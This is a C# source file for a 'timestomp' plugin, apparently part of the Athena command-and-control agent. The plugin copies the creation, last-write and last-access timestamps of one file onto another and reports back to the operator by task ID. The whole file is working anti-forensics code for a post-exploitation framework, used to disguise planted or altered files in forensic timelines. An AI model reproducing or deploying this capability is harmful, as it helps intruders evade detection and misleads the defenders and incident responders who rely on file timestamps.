using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Linq;
using System.Net.NetworkInformation;
using Athena.Commands.Models;
using Athena.Commands;
using Athena.Models.Comms.Tasks;

namespace Plugins
{
    public class TimeStomp : IPlugin
    {
        public string Name => "timestomp";

        public bool Interactive => false;

        public void Interact(InteractiveMessage message)
        {
            throw new NotImplementedException();
        }

        public bool IsRunning()
        {
            throw new NotImplementedException();
        }

        public void Start(Dictionary<string, string> args)
        {
            StringBuilder sb = new StringBuilder();

            string sourceFile = args["source"];
            string destFile = args["destination"];

            DateTime ct;
            DateTime lwt;
            DateTime lat;

            if (File.Exists(sourceFile))
            {
                if (File.Exists(destFile))
                {
                    try
                    {
                        ct = File.GetCreationTime(sourceFile);
                        lwt = File.GetLastWriteTime(sourceFile);
                        lat = File.GetLastAccessTime(sourceFile);

                        File.SetCreationTime(destFile, ct);
                        File.SetLastWriteTime(destFile, lwt);
                        File.SetLastAccessTime(destFile, lat);

                        sb.AppendFormat("Time attributes applied to {0}:", destFile).AppendLine();
                        sb.AppendFormat("\tCreation Time: {0}", ct).AppendLine();
                        sb.AppendFormat("\tLast Write Time: {0}", lwt).AppendLine();
                        sb.AppendFormat("\tLast Access Time: {0}", lat).AppendLine();
                    }
                    catch (Exception e)
                    {
                        sb.AppendFormat("Could not timestomp {0}: {1}", destFile, e.ToString()).AppendLine();
                    }
                }
                else
                {
                    sb.AppendFormat("{0} does not exist! Check your path", destFile).AppendLine();
                }
            }
            else
            {
                sb.AppendFormat("{0} does not exist! Check your path", sourceFile).AppendLine();
            }
            TaskResponseHandler.Write(sb.ToString(), args["task-id"], true);
        }

        public void Stop(string task_id)
        {
            throw new NotImplementedException();
        }
    }
}